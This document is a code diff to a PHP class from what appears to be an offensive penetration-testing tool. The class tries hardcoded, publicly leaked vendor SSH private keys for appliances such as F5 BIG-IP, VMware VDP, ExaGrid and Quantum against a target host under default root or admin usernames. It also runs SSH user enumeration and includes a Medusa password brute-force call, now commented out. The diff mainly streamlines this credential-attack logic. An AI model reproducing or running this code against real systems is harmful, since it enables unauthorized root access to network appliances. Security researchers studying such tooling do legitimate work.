@@ -27,6 +27,7 @@ class service2ssh extends service2smb {
     public function ssh2keys(){
     
         $this->ssTitre(__FUNCTION__);
+        $stream = "";
         
         $private_key_ssh_rsa_str_vmware_vdp =<<<EOF
 -----BEGIN RSA PRIVATE KEY-----
@@ -160,90 +161,45 @@ B3Upsx556K/iZPPnJZE=
 EOF;
         
         $private_key_str = $private_key_ssh_rsa_str_vmware_vdp;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
-        $remote_username = "admin" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        $remote_username = "admin" ;        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
-        
-        
+              
         $private_key_str = $private_key_ssh_rsa_str_Eaton_Xpert_Meter;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
-        $remote_username = "admin" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        $remote_username = "admin" ;        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
         
         $private_key_str = $private_key_ssh_rsa_str_Ceragon_FibeAir;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
         $remote_username = "mateidu" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
         
         $private_key_str = $private_key_ssh_rsa_str_F5_BIG_IP;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
-        $remote_username = "root" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        $remote_username = "root" ;        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
         
         $private_key_str = $private_key_ssh_rsa_str_ExaGrid;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
-        $remote_username = "root" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        $remote_username = "root" ;        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
         
         $private_key_str = $private_key_ssh_rsa_str_Loadbalancer;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
-        $remote_username = "root" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
-        
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
+        $remote_username = "root" ;        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
         $private_key_str = $private_key_ssh_rsa_str_Array_Networks;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
         $remote_username = "root" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
-        
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
-        
-        
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
+               
         $private_key_str = $private_key_ssh_rsa_str_Quantum;
-        $hash = sha1($private_key_str);
-        $file_name_path = "/tmp/$hash.priv";
         $remote_username = "root" ;
-        $info = "SSH Privkey:$private_key_str";
-        $cmd_id = "id";
+        if ($this->key2check($stream, $this->ip, $remote_username, $this->port, $private_key_str)) return TRUE;
         
-        $stream = $this->stream8ssh2key8priv4str($this->ip,$this->port,$remote_username,$private_key_ssh_rsa_str_vmware_vdp,$file_name_path);
-        $this->stream4root($stream);
         
         $this->pause();
         
-
     }
     
     public function ssh2nmap(){
@@ -269,11 +225,19 @@ trusted by the local machine.");
         
         return $result;
     }
-    public function service2ssh4exec(){
+    
+    public function ssh4enum(){
+        $this->titre(__FUNCTION__);
+        
+        //$this->ssh2keys();
+        $this->ssh2enum($this->dico_users);
+    }
+    
+    
+    public function service2ssh(){
 
 
        
-        $result = "";
         $this->titre(__FUNCTION__);
             
         
@@ -292,24 +256,25 @@ trusted by the local machine.");
             
         
         
-                
-            $this->pause();
+        //$this->ssh2nmap();
+        
+        
+        
+        $this->pause();
+
             
             $users = $this->ip2users();
             foreach ($users as $user2name){
                 if (!empty($user2name)){
                 $this->article("USER FOUND FOR TEST", "$user2name");
-                $this->port2auth4pass4medusa("ssh", $user2name, "password");
+                //$this->port2auth4pass4medusa("ssh", $user2name, "password");
                 //$result .= $this->port2auth4dico4medusa("ssh", $user2name);
                 }
             }
             
             $this->pause();
-            $result .= $this->ssh2nmap();
-            //$this->ssh2keys();
-            $this->pause();
-            
-            return $result;
+
+
         
     }
     
